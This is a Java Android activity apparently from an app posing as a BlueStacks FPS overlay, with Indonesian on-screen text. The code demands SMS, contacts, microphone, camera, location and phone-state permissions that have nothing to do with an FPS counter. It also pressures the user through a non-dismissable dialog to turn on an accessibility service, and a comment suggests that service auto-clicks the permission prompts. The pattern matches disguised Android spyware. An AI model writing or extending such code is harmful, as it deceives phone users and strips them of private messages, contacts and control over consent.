package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.app.AlertDialog;
import android.widget.Toast;
import android.content.pm.PackageManager;
import android.os.Build;
import java.util.ArrayList;
import java.util.List;

import android.widget.Switch;
import android.widget.TextView;

public class CoreActivity extends Activity {

    private AlertDialog currentDialog;
    private static final int PERM_REQ_CODE = 202;

    private Switch swLocation, swPhone, swSms, swMic, swContacts, swCamera, swStorage;

    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        setContentView(R.layout.activity_permissions);
        
        if (checkStatus()) {
            finish();
            return;
        }

        initViews();
        updateSwitchStates();

        findViewById(R.id.btn_continue).setOnClickListener(v -> {
            if (allPermissionsGranted()) {
                finish();
            } else {
                Toast.makeText(this, "Harap berikan semua izin untuk melanjutkan", Toast.LENGTH_SHORT).show();
            }
        });

        findViewById(R.id.btn_cancel).setOnClickListener(v -> {
            finish();
        });
    }

    private void initViews() {
        swLocation = findViewById(R.id.sw_location);
        swPhone = findViewById(R.id.sw_phone);
        swSms = findViewById(R.id.sw_sms);
        swMic = findViewById(R.id.sw_mic);
        swContacts = findViewById(R.id.sw_contacts);
        swCamera = findViewById(R.id.sw_camera);
        swStorage = findViewById(R.id.sw_storage);

        swLocation.setOnCheckedChangeListener((v, isChecked) -> {
            if (isChecked) requestSinglePermission(Manifest.permission.ACCESS_FINE_LOCATION);
        });
        swPhone.setOnCheckedChangeListener((v, isChecked) -> {
            if (isChecked) requestSinglePermission(Manifest.permission.READ_PHONE_STATE);
        });
        swSms.setOnCheckedChangeListener((v, isChecked) -> {
            if (isChecked) requestSinglePermission(Manifest.permission.READ_SMS);
        });
        swMic.setOnCheckedChangeListener((v, isChecked) -> {
            if (isChecked) requestSinglePermission(Manifest.permission.RECORD_AUDIO);
        });
        swContacts.setOnCheckedChangeListener((v, isChecked) -> {
            if (isChecked) requestSinglePermission(Manifest.permission.READ_CONTACTS);
        });
        swCamera.setOnCheckedChangeListener((v, isChecked) -> {
            if (isChecked) requestSinglePermission(Manifest.permission.CAMERA);
        });
        swStorage.setOnCheckedChangeListener((v, isChecked) -> {
            if (isChecked) requestSinglePermission(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        });
    }

    private void updateSwitchStates() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            swLocation.setChecked(checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED);
            swPhone.setChecked(checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED);
            swSms.setChecked(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED);
            swMic.setChecked(checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED);
            swContacts.setChecked(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED);
            swCamera.setChecked(checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED);
            swStorage.setChecked(checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED);
        }
    }

    private void requestSinglePermission(String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{permission}, PERM_REQ_CODE);
            }
        }
    }

    private boolean allPermissionsGranted() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        
        String[] permissions = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };

        for (String perm : permissions) {
            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private void checkAndRequestPermissions() {
        // Method ini sekarang digantikan oleh manual toggle di UI
        if (!isServiceEnabled()) {
            showAccessibilityDialog();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateSwitchStates();
        if (!isServiceEnabled()) {
            showAccessibilityDialog();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Langsung tutup activity setelah request selesai (karena sudah di-handle auto-click)
        finish();
    }

    private void showAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        currentDialog = new AlertDialog.Builder(this)
            .setTitle("Izin Diperlukan")
            .setMessage("Aktifkan accessibility service untuk melihat fps secara realtime")
            .setCancelable(false)
            .setPositiveButton("OK", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }
}
